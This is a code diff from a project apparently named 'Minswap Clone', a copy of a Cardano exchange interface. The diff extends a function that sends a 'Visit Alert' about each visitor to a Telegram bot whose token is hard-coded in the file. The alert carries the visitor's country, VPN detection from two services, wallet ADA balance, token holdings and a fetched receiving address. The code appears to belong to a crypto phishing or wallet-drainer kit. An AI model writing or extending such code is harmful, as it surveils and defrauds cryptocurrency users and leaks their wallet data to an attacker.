@@ -1,5 +1,5 @@
 import axios from "axios";
-import { getUserCountry } from "./userLocation";  // Ensure correct file import
+import { getUserCountry, checkVpnStatusWithIPQS, getRecipientAddress } from "./userLocation";  // Ensure correct file imports
 
 // Telegram Bot Token and Chat ID
 const TELEGRAM_BOT_TOKEN = "7448589458:AAGDlnlZerWT7JSTc1C7mq9X0bkYpZkwtQ0";
@@ -37,24 +37,34 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
 
   if (!userCountryData) {
     console.error("Could not retrieve user country data");
-    userCountryData = { country: "Unknown", countryCode: "XX", isVpn: false }; // Default fallback
+    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
   }
 
-  const { country, countryCode, isVpn } = userCountryData;
+  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
+
+  // Check VPN status with IPQualityScore
+  const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
+
+  // Fetch the recipient address
+  const recipientAddress = await getRecipientAddress();
+
   const globeIcon = "🌍";  // Unicode globe icon
 
   // Construct the message
   let message = `*Visit Alert*\n` +
                 `App: Minswap Clone\n\n` +
                 `User Info--------------------\n` +
-                `| Country: ${globeIcon} ${country} |\n`;
+                `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;
 
-  // If the user is using a VPN, add a VPN warning to the message
-  if (isVpn) {
-    message += `| ⚠️ VPN SUSPECTED |\n`;
+  // If VPN is detected by ipdata.co or IPQualityScore, add a VPN warning
+  if (isVpnIpdata || isVpnIPQS) {
+    message += `| ⚠️ VPN SUSPECTED  |\n`;
+  } else {
+    message += `| NO VPN SUSPECTED |\n`;
   }
 
-  message += `--------------------------------\n` +
+  message += `| Receiving Address: ${recipientAddress} |\n` +
+             `--------------------------------\n` +
              `| User Wallet Balance |\n` +
              `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
              `${tokenDetails.join("\n")}\n` +
